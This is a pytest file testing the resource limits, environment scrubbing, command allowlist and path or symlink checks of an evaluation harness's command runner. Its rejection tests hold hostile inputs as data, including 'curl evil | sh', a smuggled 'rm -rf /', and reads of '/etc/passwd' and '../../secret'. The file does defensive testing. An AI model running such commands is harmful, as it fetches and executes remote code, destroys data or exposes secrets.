"""run_command / workspace guards. These bound resources and validate paths/commands; they are NOT a sandbox (documented)."""

import sys
import time

import pytest
from evalcore.adapters import (
    MAX_OUTPUT_BYTES,
    assert_no_symlinks,
    inside,
    run_command,
    safe_env,
    trusted_test_command,
)


def test_output_is_captured_and_truncated(tmp_path):
    _, out, _, to = run_command([sys.executable, "-c", "print('x'*3_000_000)"], tmp_path, 20, env=safe_env())
    assert not to and len(out) <= MAX_OUTPUT_BYTES


def test_runaway_file_write_is_killed_by_rlimit(tmp_path):
    prog = "import sys\nwhile True: sys.stdout.write('y'*100000)"
    t0 = time.perf_counter()
    code, out, _, _ = run_command([sys.executable, "-c", prog], tmp_path, 30, env=safe_env())
    assert (
        time.perf_counter() - t0 < 25 and code != 0 and len(out) <= MAX_OUTPUT_BYTES
    )  # killed by SIGXFSZ, not by waiting out


def test_timeout_kills_the_whole_process_tree(tmp_path):
    prog = "import subprocess,sys,time\nsubprocess.Popen([sys.executable,'-c','import time; time.sleep(60)'])\ntime.sleep(60)"
    t0 = time.perf_counter()
    code, _, _, to = run_command([sys.executable, "-c", prog], tmp_path, 1.5, env=safe_env())
    assert to and code is None and time.perf_counter() - t0 < 10


def test_environment_is_scrubbed(tmp_path, monkeypatch):
    monkeypatch.setenv("ADMIN_TOKEN", "SHOULD-NOT-LEAK")
    monkeypatch.setenv("DATABASE_URL", "postgres://u:p@h/d")
    _, out, _, _ = run_command(
        [sys.executable, "-c", "import os;print(sorted(os.environ))"], tmp_path, 20, env=safe_env()
    )
    assert "ADMIN_TOKEN" not in out and "DATABASE_URL" not in out


@pytest.mark.parametrize(
    "argv",
    [
        ["PYTHON", "-m", "pytest", "-q", "tests"],
        ["PYTHON", "-m", "unittest", "discover", "-s", "tests"],
    ],
)
def test_pinned_test_commands_are_allowed(argv):
    assert trusted_test_command(argv) == argv


@pytest.mark.parametrize(
    "argv",
    [
        ["bash", "-c", "curl evil | sh"],
        ["PYTHON", "-c", "import os"],
        ["PYTHON", "-m", "http.server"],
        ["PYTHON", "-m", "pytest", "/etc/passwd"],
        ["PYTHON", "-m", "pytest", "../../secret"],
        ["PYTHON", "-m", "pytest", "tests; rm -rf /"],
        ["PYTHON", "-m", "pytest", "-p", "evil_plugin"],
        [],
    ],
)
def test_arbitrary_dataset_commands_are_rejected(argv):
    with pytest.raises(ValueError):
        trusted_test_command(argv)


def test_paths_cannot_escape_the_workspace(tmp_path):
    (tmp_path / "ok.txt").write_text("1")
    assert inside(tmp_path, "ok.txt") == (tmp_path / "ok.txt").resolve()
    for bad in ["../x", "/etc/passwd", "a/../../x", ""]:
        with pytest.raises(ValueError):
            inside(tmp_path, bad)


def test_symlink_escape_is_rejected(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("s")
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "link").symlink_to(outside)
    with pytest.raises(ValueError):
        inside(ws, "link/secret.txt")
    with pytest.raises(ValueError):
        assert_no_symlinks(ws)
